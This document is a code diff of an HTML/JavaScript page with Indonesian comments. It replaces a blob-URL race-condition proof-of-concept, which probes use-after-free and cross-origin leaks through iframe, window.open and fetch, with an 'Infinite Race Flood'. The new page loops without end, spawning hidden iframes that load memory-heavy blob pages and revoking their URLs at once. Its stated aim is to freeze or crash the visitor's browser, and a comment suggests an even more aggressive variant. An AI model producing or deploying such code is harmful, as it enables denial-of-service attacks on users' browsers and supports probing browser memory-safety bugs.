@@ -1,185 +1,125 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Blob URL Race Condition Test</title>
+<title>Infinite Race Flood</title>
 <style>
-  body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
-  #log { background: #000; padding: 15px; border: 1px solid #444; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; }
-  .success { color: #4caf50; font-weight: bold; }
-  .error { color: #f44336; font-weight: bold; }
-  .info { color: #2196f3; }
-  button { padding: 10px 20px; background: #0e639c; color: #fff; border: none; cursor: pointer; margin-bottom: 10px; }
-  button:hover { background: #1177bb; }
+  body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+  #status { font-size: 20px; font-weight: bold; margin-bottom: 20px; color: #ff0; }
+  #log { height: 300px; overflow-y: auto; border: 1px solid #333; padding: 10px; font-size: 12px; }
+  .danger { color: #f00; }
+  .ok { color: #0f0; }
 </style>
 </head>
 <body>
-
-<h1>Blob URL Race Condition PoC</h1>
-<button id="startBtn">▶ Jalankan Race Condition Test</button>
-<button id="clearBtn">Bersihkan Log</button>
-<div id="log">Menunggu eksekusi...</div>
+<h1>💀 INFINITE RACE FLOOD</h1>
+<div id="status">Menunggu perintah...</div>
+<button id="startBtn" style="padding:15px; font-size:18px; background:red; color:white; border:none; cursor:pointer;">🔥 MULAI FLOODING</button>
+<div id="log"></div>
 
 <script>
+const statusEl = document.getElementById('status');
 const logEl = document.getElementById('log');
+let isRunning = false;
+let counter = 0;
 
-function log(msg, type = '') {
-  const time = new Date().toISOString().substr(11, 8);
-  const line = `[${time}] ${msg}\n`;
-  logEl.innerHTML += type ? `<span class="${type}">${line}</span>` : line;
-  logEl.scrollTop = logEl.scrollHeight;
-  console.log(msg);
+function log(msg, isDanger) {
+    const div = document.createElement('div');
+    div.className = isDanger ? 'danger' : 'ok';
+    div.textContent = `[${new Date().toISOString().substr(11, 8)}] ${msg}`;
+    logEl.appendChild(div);
+    // Batasi log agar tidak memakan memori (hanya simpan 100 log terakhir)
+    if (logEl.childNodes.length > 100) {
+        logEl.removeChild(logEl.firstChild);
+    }
+    logEl.scrollTop = logEl.scrollHeight;
 }
 
-document.getElementById('clearBtn').onclick = () => { logEl.innerHTML = ''; };
+// ============================================
+// INFINITE LOOP FLOODING FUNCTION
+// ============================================
+function startInfiniteFlood() {
+    if (isRunning) return;
+    isRunning = true;
+    statusEl.textContent = "🔥 FLOODING BERJALAN... JANGAN TUTUP TAB!";
+    statusEl.style.color = "#f00";
 
-// ============================================
-// TEST 1: Use-After-Free (UAF) via Iframe Navigation
-// ============================================
-async function testUAFNavigation() {
-  log('=== TEST 1: UAF via Iframe Navigation ===', 'info');
-  
-  // Payload HTML yang akan dieksekusi di dalam iframe
-  const htmlPayload = `
-    <!DOCTYPE html>
-    <html>
-    <body style="background:#222;color:#0f0;font-family:monospace;">
-      <h2 id="status">Iframe Loaded</h2>
-      <script>
-        // Coba akses parent (jika origin sama, ini akan sukses)
+    // Payload HTML berat (untuk memperlambat render & memicu memory leak)
+    const heavyHTML = `
+        <!DOCTYPE html>
+        <html>
+        <body>
+        <script>
+            // Loop alokasi memori di dalam iframe
+            let arr = [];
+            for(let i=0; i<10000; i++) {
+                arr.push(new Array(1000).fill('X'));
+            }
+            // Kirim sinyal balik ke parent jika berhasil
+            try { parent.postMessage('LOADED', '*'); } catch(e) {}
+        <\/script>
+        </body>
+        </html>
+    `;
+
+    const blob = new Blob([heavyHTML], { type: 'text/html' });
+
+    // FUNGSI REKURSIF YANG DIPANGGIL TERUS MENERUS
+    function flood() {
+        if (!isRunning) return;
+
         try {
-          if (window.parent && window.parent.location.href.includes('blob:')) {
-            parent.postMessage('LEAK_SUCCESS: Origin accessible', '*');
-          }
-        } catch(e) {
-          parent.postMessage('SOP_BLOCKED: ' + e.message, '*');
+            counter++;
+            const url = URL.createObjectURL(blob);
+            
+            // Buat iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            
+            // Set src (navigasi)
+            iframe.src = url;
+            document.body.appendChild(iframe);
+
+            // RACE CONDITION: Revoke instan tanpa menunggu load
+            // Kita gunakan setTimeout 0 agar berada di tick berikutnya (microtask queue)
+            setTimeout(() => {
+                URL.revokeObjectURL(url);
+                // Hapus iframe dari DOM agar garbage collector bekerja
+                if (iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+            }, 0);
+
+            // Log setiap 1000 iterasi agar tidak terlalu membebani UI
+            if (counter % 1000 === 0) {
+                statusEl.textContent = `🔥 Total Flooding: ${counter} | Membuat browser crash...`;
+                log(`Telah memicu ${counter} race condition (iframe + revoke)`, false);
+            }
+
+        } catch (e) {
+            log(`Error pada iterasi ${counter}: ${e.message}`, true);
         }
-        // Loop berat untuk memperlambat loading
-        let a = [];
-        for(let i=0; i<100000; i++) { a.push(i); }
-      <\/script>
-    </body>
-    </html>
-  `;
 
-  const blob = new Blob([htmlPayload], { type: 'text/html' });
-  
-  for (let i = 0; i < 50; i++) {
-    const url = URL.createObjectURL(blob);
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
+        // PANGGIL LAGI SECARA INSTAN (Infinite Loop tanpa jeda)
+        // Menggunakan queueMicrotask agar tidak memblokir total event loop utama
+        // tapi tetap membanjiri memory dan task queue.
+        queueMicrotask(flood);
+        
+        // ALTERNATIF: Jika ingin lebih agresif dan langsung freeze, hapus queueMicrotask 
+        // dan panggil flood() langsung (tapi UI akan freeze total).
+        // flood(); 
+    }
 
-    // RACE: Set src, lalu langsung revoke
-    iframe.src = url;
-    
-    // Waktu revoke sangat krusial di sini (0ms, 1ms, 5ms)
-    setTimeout(() => {
-      URL.revokeObjectURL(url);
-      // log('Revoked URL: ' + url.substring(0, 30) + '...', 'info');
-    }, i % 3); // Variasi delay
-
-    // Cek apakah iframe crash atau memicu error
-    iframe.onerror = () => {
-      log(`Iframe error terdeteksi pada iterasi ${i}`, 'error');
-    };
-
-    // Bersihkan DOM setelah beberapa saat
-    setTimeout(() => { if(iframe.parentNode) document.body.removeChild(iframe); }, 1000);
-  }
-  log('Terkirim 50 request navigasi dengan revoke instan.', 'info');
+    flood();
 }
 
 // ============================================
-// TEST 2: Cross-Origin Blob Leak via Window.open
+// TRIGGER
 // ============================================
-async function testWindowLeak() {
-  log('=== TEST 2: Cross-Origin Leak via Window.open ===', 'info');
-
-  const htmlPayload = `
-    <!DOCTYPE html>
-    <html>
-    <body style="background:#111;color:#fff;">
-      <h1>Leaked Window</h1>
-      <script>
-        // Kirim pesan ke opener (halaman utama)
-        if (window.opener) {
-          try {
-            window.opener.postMessage('BLOB_LEAK: Origin ' + location.origin, '*');
-          } catch(e) {}
-        }
-      <\/script>
-    </body>
-    </html>
-  `;
-
-  const blob = new Blob([htmlPayload], { type: 'text/html' });
-  const url = URL.createObjectURL(blob);
-
-  // Buka window baru
-  const win = window.open(url, '_blank');
-  if (!win) {
-    log('Popup diblokir. Tidak bisa tes window leak.', 'error');
-    return;
-  }
-
-  // RACE: Revoke URL saat window sedang loading
-  log('Window dibuka, mencoba revoke URL saat loading...', 'info');
-  setTimeout(() => {
-    URL.revokeObjectURL(url);
-    log('URL telah di-revoke.', 'info');
-  }, 10); // Coba revoke setelah 10ms
-
-  // Listener untuk pesan dari window baru
-  window.addEventListener('message', (e) => {
-    log('Pesan diterima dari window: ' + e.data, 'success');
-  }, { once: true });
-}
-
-// ============================================
-// TEST 3: Blob URL + fetch (UAF di memory)
-// ============================================
-async function testFetchRace() {
-  log('=== TEST 3: Fetch Race (Use-After-Free) ===', 'info');
-
-  const blob = new Blob(['console.log("Test");'], { type: 'application/javascript' });
-  const url = URL.createObjectURL(blob);
-
-  // Mulai fetch
-  const fetchPromise = fetch(url).then(r => r.text());
-
-  // Revoke saat fetch sedang berjalan
-  setTimeout(() => {
-    URL.revokeObjectURL(url);
-    log('URL di-revoke saat fetch berjalan.', 'info');
-  }, 0);
-
-  try {
-    const text = await fetchPromise;
-    log('Fetch berhasil membaca: ' + text, 'success');
-  } catch (e) {
-    log('Fetch gagal (expected jika revoke agresif): ' + e.message, 'error');
-  }
-}
-
-// ============================================
-// RUN ALL
-// ============================================
-document.getElementById('startBtn').onclick = async () => {
-  logEl.innerHTML = '';
-  log('Memulai Race Condition Test Suite...', 'info');
-  
-  await testUAFNavigation();
-  await new Promise(r => setTimeout(r, 2000));
-  
-  await testWindowLeak();
-  await new Promise(r => setTimeout(r, 2000));
-
-  await testFetchRace();
-  
-  log('=== Test Selesai ===', 'info');
-  log('Cek tab/window baru dan console untuk melihat apakah ada error/crash/UAF.', 'info');
-};
+document.getElementById('startBtn').addEventListener('click', () => {
+    log("PERINGATAN: Browser akan freeze/crash!", true);
+    startInfiniteFlood();
+});
 </script>
 </body>
 </html>
